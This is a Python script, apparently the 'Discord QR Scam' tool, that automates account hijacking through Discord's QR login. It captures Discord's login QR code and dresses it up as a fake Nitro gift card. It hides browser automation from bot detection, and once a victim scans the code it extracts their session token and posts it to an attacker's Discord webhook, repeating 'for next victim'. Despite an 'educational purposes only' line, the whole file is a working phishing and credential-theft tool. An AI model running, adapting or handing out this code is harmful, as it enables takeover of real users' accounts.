from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
import os
import json
import shutil

from PIL import Image, ImageDraw, ImageFont
import requests
import time

# Developer: NightfallGT
# Educational purposes only

# Detect if running in a Docker/headless environment
IN_DOCKER = os.environ.get('DOCKER', 'false').lower() == 'true'

# Discord webhook URL — set WEBHOOK_URL as an environment variable
# For Railway: Settings → Variables → Add WEBHOOK_URL
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')


def send_to_webhook(token):
    """Send the grabbed token to the Discord webhook."""
    if not WEBHOOK_URL:
        print('- Webhook URL not set.')
        return

    data = {
        'content': f'@everyone **Token grabbed!**',
        'embeds': [{
            'title': 'Discord Token',
            'description': f'```{token}```',
            'color': 0x5865F2,
            'footer': {'text': 'Discord QR Scam Generator'}
        }]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=30)
        response.raise_for_status()
        print('- Token sent to webhook successfully!')
    except requests.exceptions.RequestException as e:
        print(f'- Failed to send token to webhook: {e}')


def send_qr_to_webhook():
    """Send the QR code image to the Discord webhook."""
    if not WEBHOOK_URL:
        return
    if not os.path.exists('discord_gift.png'):
        print('- QR image not found to send.')
        return

    try:
        with open('discord_gift.png', 'rb') as f:
            files = {'file': ('discord_gift.png', f, 'image/png')}
            payload = {'content': '@everyone **Nitro Gift - Scan to claim!**'}
            response = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=30)
            response.raise_for_status()
        print('- QR image sent to webhook!')
    except requests.exceptions.RequestException as e:
        print(f'- Failed to send QR image: {e}')


def generate_overlay():
    """Generate a Discord-like overlay image if overlay.png doesn't exist."""
    size = 400
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)

    # Draw a blurple circle background
    circle_center = size // 2
    circle_radius = size // 2 - 10
    draw.ellipse(
        [circle_center - circle_radius, circle_center - circle_radius,
         circle_center + circle_radius, circle_center + circle_radius],
        fill=(88, 101, 242, 255)
    )

    # Draw a simple Discord-style headphone icon
    cx, cy = circle_center, circle_center
    band_top = cy - 55
    band_bottom = cy - 20

    # Headphone band (top arc: left → top → right)
    draw.arc(
        [cx - 80, band_top, cx + 80, band_bottom + 40],
        start=180, end=360, fill=(255, 255, 255, 255), width=14
    )
    # Left ear cup
    draw.rounded_rectangle(
        [cx - 100, band_bottom - 10, cx - 60, band_bottom + 30],
        radius=8, fill=(255, 255, 255, 255)
    )
    # Right ear cup
    draw.rounded_rectangle(
        [cx + 60, band_bottom - 10, cx + 100, band_bottom + 30],
        radius=8, fill=(255, 255, 255, 255)
    )
    # Mic boom (left side)
    draw.rounded_rectangle(
        [cx - 70, band_bottom + 25, cx - 35, band_bottom + 55],
        radius=6, fill=(255, 255, 255, 255)
    )
    # Mic tip
    draw.ellipse(
        [cx - 40, band_bottom + 48, cx - 28, band_bottom + 60],
        fill=(255, 255, 255, 255)
    )

    # Save as overlay
    overlay_path = os.path.join(os.getcwd(), 'temp', 'overlay.png')
    img.save(overlay_path)
    return img


def generate_template():
    """Generate a Discord Nitro gift card template if template.png doesn't exist."""
    width, height = 600, 800
    img = Image.new('RGB', (width, height), (32, 34, 37, 255))  # Discord dark
    draw = ImageDraw.Draw(img)

    # Gradient background (top to bottom)
    top_color = (32, 34, 37)
    bottom_color = (20, 22, 25)
    for y in range(height):
        r = int(top_color[0] + (bottom_color[0] - top_color[0]) * y / height)
        g = int(top_color[1] + (bottom_color[1] - top_color[1]) * y / height)
        b = int(top_color[2] + (bottom_color[2] - top_color[2]) * y / height)
        draw.line([(0, y), (width, y)], fill=(r, g, b))

    # Header accent bar
    draw.rectangle([(0, 0), (width, 8)], fill=(88, 101, 242, 255))

    # Gift box icon area (top)
    gift_box_y = 60
    box_size = 80
    bx = (width - box_size) // 2
    # Gift box
    draw.rounded_rectangle(
        [(bx, gift_box_y), (bx + box_size, gift_box_y + box_size)],
        radius=16, fill=(47, 49, 54, 255), outline=(88, 101, 242, 255), width=3
    )
    # Gift ribbon
    ribbon_cx = width // 2
    draw.ellipse(
        [(ribbon_cx - 8, gift_box_y - 5), (ribbon_cx + 8, gift_box_y + 15)],
        fill=(88, 101, 242, 255)
    )
    # Bow
    draw.ellipse(
        [(ribbon_cx - 15, gift_box_y - 2), (ribbon_cx - 5, gift_box_y + 8)],
        fill=(88, 101, 242, 255)
    )
    draw.ellipse(
        [(ribbon_cx + 5, gift_box_y - 2), (ribbon_cx + 15, gift_box_y + 8)],
        fill=(88, 101, 242, 255)
    )

    # Try to load a nice font, fallback gracefully
    font_large = None
    font_medium = None
    font_small = None
    font_candidates = [
        'arial.ttf',
        '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf',
        '/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf',
        '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf',
    ]
    for font_path in font_candidates:
        try:
            font_large = ImageFont.truetype(font_path, 44)
            font_medium = ImageFont.truetype(font_path, 22)
            font_small = ImageFont.truetype(font_path, 16)
            break
        except (IOError, OSError):
            continue
    if font_large is None:
        font_large = ImageFont.load_default()
        font_medium = font_large
        font_small = font_large

    # "NITRO" title text
    nitro_y = gift_box_y + box_size + 30
    nitro_text = 'DISCORD NITRO'
    bbox = draw.textbbox((0, 0), nitro_text, font=font_large)
    text_w = bbox[2] - bbox[0]
    draw.text(
        ((width - text_w) // 2, nitro_y),
        nitro_text, fill=(255, 255, 255, 255), font=font_large
    )

    # Subtitle
    gift_text = 'GIFT CODE'
    bbox = draw.textbbox((0, 0), gift_text, font=font_medium)
    text_w = bbox[2] - bbox[0]
    draw.text(
        ((width - text_w) // 2, nitro_y + 55),
        gift_text, fill=(140, 143, 147, 255), font=font_medium
    )

    # White QR code placeholder box
    qr_box_y = nitro_y + 120
    qr_box_size = 220
    qb_x = (width - qr_box_size) // 2
    draw.rounded_rectangle(
        [(qb_x, qr_box_y), (qb_x + qr_box_size, qr_box_y + qr_box_size)],
        radius=12, fill=(255, 255, 255, 255)
    )

    # Instruction text below QR
    inst_y = qr_box_y + qr_box_size + 30
    inst_text = 'Scan to claim your Nitro gift'
    bbox = draw.textbbox((0, 0), inst_text, font=font_small)
    text_w = bbox[2] - bbox[0]
    draw.text(
        ((width - text_w) // 2, inst_y),
        inst_text, fill=(140, 143, 147, 255), font=font_small
    )

    # Footer text
    footer_y = height - 50
    footer_text = 'Expires in 2 minutes'
    bbox = draw.textbbox((0, 0), footer_text, font=font_small)
    text_w = bbox[2] - bbox[0]
    draw.text(
        ((width - text_w) // 2, footer_y),
        footer_text, fill=(90, 92, 96, 255), font=font_small
    )

    # Save as template
    template_path = os.path.join(os.getcwd(), 'temp', 'template.png')
    img.save(template_path)
    return img


def logo_qr():
    qr = Image.open('temp/qr_code.png', 'r')

    # Generate overlay if it doesn't exist
    overlay_path = 'temp/overlay.png'
    if not os.path.exists(overlay_path):
        print('- Generating Discord overlay...')
        generate_overlay()

    overlay = Image.open(overlay_path, 'r')

    # If overlay has transparency, use it as mask; otherwise paste normally
    overlay_resized = overlay.copy()

    # Center the overlay on the QR code (use 35% of QR size for a clean look)
    target_size = int(min(qr.size) * 0.35)
    overlay_resized.thumbnail((target_size, target_size), Image.LANCZOS)

    x = (qr.width - overlay_resized.width) // 2
    y = (qr.height - overlay_resized.height) // 2

    if overlay_resized.mode == 'RGBA':
        qr.paste(overlay_resized, (x, y), overlay_resized)
    else:
        qr.paste(overlay_resized, (x, y))

    qr.save('temp/final_qr.png', quality=95)


def find_white_rect(image, anchor_x, anchor_y, threshold=220, min_size=50):
    """Find the white rectangle region around an anchor point in the image."""
    pixels = image.load()
    w, h = image.size

    def is_white(x, y):
        r, g, b = pixels[x, y]
        return r > threshold and g > threshold and b > threshold

    # Scan horizontally from anchor to find left/right bounds
    x2 = anchor_x
    while x2 < w and is_white(x2, anchor_y):
        x2 += 1
    x1 = anchor_x
    while x1 >= 0 and is_white(x1, anchor_y):
        x1 -= 1
    x1 += 1

    box_w = x2 - x1
    if box_w < min_size:
        return None

    # Scan vertically from the horizontal center to avoid corner clipping
    mid_x = (x1 + x2) // 2
    y2 = anchor_y
    while y2 < h and is_white(mid_x, y2):
        y2 += 1
    y1 = anchor_y
    while y1 >= 0 and is_white(mid_x, y1):
        y1 -= 1
    y1 += 1

    box_h = y2 - y1

    if box_h < min_size:
        return None
    return (x1, y1, x2, y2)


def paste_template():
    # Generate template if it doesn't exist
    template_path = 'temp/template.png'
    if not os.path.exists(template_path):
        print('- Generating gift card template...')
        generate_template()

    template = Image.open(template_path, 'r').convert('RGB')
    qr_final = Image.open('temp/final_qr.png', 'r')

    # Derive anchor from the original paste position (center of a ~220x220 white box)
    anchor_x, anchor_y = 120 + 110, 409 + 110
    rect = find_white_rect(template, anchor_x, anchor_y)

    if rect is None:
        print('- Could not detect white area, using default positioning.')
        rect = (120, 409, 120 + 220, 409 + 220)

    box_w = rect[2] - rect[0]
    box_h = rect[3] - rect[1]

    # Add inner padding (8% on each side)
    pad_x = int(box_w * 0.08)
    pad_y = int(box_h * 0.08)
    inner = (rect[0] + pad_x, rect[1] + pad_y, rect[2] - pad_x, rect[3] - pad_y)
    inner_w = inner[2] - inner[0]
    inner_h = inner[3] - inner[1]

    # Resize QR code to fit within the padded white box
    qr_resized = qr_final.copy()
    qr_resized.thumbnail((inner_w, inner_h), Image.LANCZOS)

    # Center the QR code in the white box
    paste_x = inner[0] + (inner_w - qr_resized.width) // 2
    paste_y = inner[1] + (inner_h - qr_resized.height) // 2

    template.paste(qr_resized, (paste_x, paste_y))
    template.save('discord_gift.png', quality=95)

def create_driver(options):
    """Create a new Chrome driver instance with stealth setup."""
    # Auto-detect chromedriver via webdriver-manager (works on Windows & Linux)
    chromedriver_path = ChromeDriverManager().install()
    service = Service(chromedriver_path)

    driver = webdriver.Chrome(options=options, service=service)

    # Remove webdriver flag via CDP script injection
    driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
        'source': '''
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        '''
    })
    return driver


def build_options(profile_dir):
    """Build Chrome options with stealth settings."""
    options = webdriver.ChromeOptions()

    # Docker/headless requirements (no display available)
    if IN_DOCKER:
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')

    # Stealth options to avoid Discord bot detection
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument(
        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36'
    )
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--no-first-run')
    options.add_argument('--disable-default-apps')

    # Use a fresh temp profile per cycle — cleaned up after each cycle
    options.add_argument(f'--user-data-dir={profile_dir}')

    # Hide automation indicators
    options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
    options.add_experimental_option('useAutomationExtension', False)

    options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
    return options


def check_for_captcha(driver):
    """Check if a captcha/challenge is showing instead of the QR code."""
    try:
        page_text = driver.find_element(By.TAG_NAME, 'body').text.lower()
        captcha_keywords = ['captcha', 'verify', 'security check', 'hcaptcha', 'challenge', 'automated']
        for keyword in captcha_keywords:
            if keyword in page_text:
                return True
        # Also check for common captcha iframes
        iframes = driver.find_elements(By.TAG_NAME, 'iframe')
        for iframe in iframes:
            src = iframe.get_attribute('src') or ''
            if 'hcaptcha' in src or 'recaptcha' in src:
                return True
    except:
        pass
    return False


def run_cycle(driver):
    """Run one full cycle: generate QR → wait for scan → grab token → send to webhook.
    Returns True if cycle completed, False if should restart (captcha/expired)."""
    if IN_DOCKER:
        print('- Running in headless Docker mode.')
    print('- Navigating to Discord login...')
    driver.get('https://discord.com/login')

    # Wait for the QR code SVG element to appear
    try:
        qr_svg = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'div[class*="qrCodeContainer"] svg'))
        )
    except TimeoutException:
        if check_for_captcha(driver):
            print('- Captcha detected! Restarting browser...')
        else:
            print('- QR Code not found (possible block). Restarting...')
        return False

    print('- QR Code found.')

    qr_path = os.path.join(os.getcwd(), 'temp/qr_code.png')
    qr_svg.screenshot(qr_path)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    # Clear old performance logs
    try:
        driver.get_log('performance')
    except:
        pass

    # Send the QR image to the webhook
    send_qr_to_webhook()

    print('Send the QR Code to user and scan. Waiting..')

    # Wait for someone to scan (with 2-minute timeout for expiry)
    wait_start = time.time()
    while True:
        if discord_login != driver.current_url:
            break  # QR scanned!
        if time.time() - wait_start > 120:
            print('- QR expired (2 min).')
            return False
        time.sleep(1)

    # Wait for page to settle after login
    time.sleep(4)
    print('Grabbing token..')

    token = None

    # Method 1: Extract token from network request headers
    try:
        logs = driver.get_log('performance')
        for entry in logs:
            try:
                log_data = json.loads(entry['message'])
                msg = log_data.get('message', {})
                method = msg.get('method', '')
                params = msg.get('params', {})

                if method == 'Network.requestWillBeSentExtraInfo':
                    headers = params.get('headers', {})
                    auth = headers.get('authorization', headers.get('Authorization', ''))
                    if auth and len(auth) > 20:
                        token = auth
                        print('- Token found via network headers')
                        break

                if method == 'Network.requestWillBeSent':
                    request = params.get('request', {})
                    url = request.get('url', '')
                    if '/api/v9/' not in url:
                        continue
                    headers = request.get('headers', {})
                    auth = headers.get('authorization', headers.get('Authorization', ''))
                    if auth and len(auth) > 20:
                        token = auth
                        print('- Token found via network headers')
                        break
            except:
                continue
        if token:
            try:
                r = requests.get('https://discord.com/api/v9/users/@me',
                    headers={'Authorization': token})
                if r.status_code == 200:
                    user = r.json()
                    print(f'- Logged in as: {user.get("username", "?")}#{user.get("discriminator", "?")}')
            except:
                pass
    except Exception as e:
        print(f'- Network method error: {e}')

    # Method 2: localStorage (fallback)
    if not token:
        try:
            t = driver.execute_script('return localStorage.getItem("token");')
            if t:
                token = t.strip('"')
                print('- Token found via localStorage')
        except:
            pass

    # Method 3: Modern webpack chunk
    if not token:
        try:
            token = driver.execute_script('''
try {
    var wpm = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m);
    var mod = wpm.find(m=>m?.exports?.default?.getToken !== void 0);
    return mod ? mod.exports.default.getToken() : null;
} catch(e) { return null; }
            ''')
            if token:
                print('- Token found via webpack')
        except:
            pass

    print('---')
    if token:
        print('Token grabbed:', token)
        send_to_webhook(token)
        return True
    else:
        print('Failed to grab token.')
        return True  # Still restart to try again


def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    os.makedirs('temp', exist_ok=True)
    cycle_count = 0

    while True:
        cycle_count += 1
        print(f'\n\n==================== Cycle {cycle_count} ====================')

        # Use a temp profile per cycle — cleaned up before use
        if IN_DOCKER:
            profile_dir = f'/tmp/chrome_profile_{cycle_count}'
        else:
            profile_dir = os.path.join(os.getcwd(), f'chrome_profile_{cycle_count}')

        # Remove leftover profile from a previous interrupted cycle
        if os.path.exists(profile_dir):
            shutil.rmtree(profile_dir, ignore_errors=True)

        options = build_options(profile_dir)

        # Create a FRESH browser instance each cycle
        try:
            driver = create_driver(options)
        except Exception as e:
            print(f'- Failed to start Chrome: {e}')
            print('- Make sure no old Chrome windows are open. Close them and try again.')
            time.sleep(3)
            continue

        try:
            run_cycle(driver)
        except Exception as e:
            print(f'- Error during cycle: {e}')

        # Close the browser completely before starting the next cycle
        try:
            driver.quit()
        except:
            pass
        print('Browser closed. Restarting for next victim...')

        # Clean up the profile directory immediately
        try:
            shutil.rmtree(profile_dir, ignore_errors=True)
        except:
            pass

        # Also clean up old profiles (keep only last 2)
        if cycle_count > 2:
            old_profile = f'/tmp/chrome_profile_{cycle_count - 2}' if IN_DOCKER else os.path.join(os.getcwd(), f'chrome_profile_{cycle_count - 2}')
            try:
                shutil.rmtree(old_profile, ignore_errors=True)
            except:
                pass

        time.sleep(2)


if __name__ == '__main__':
    main()
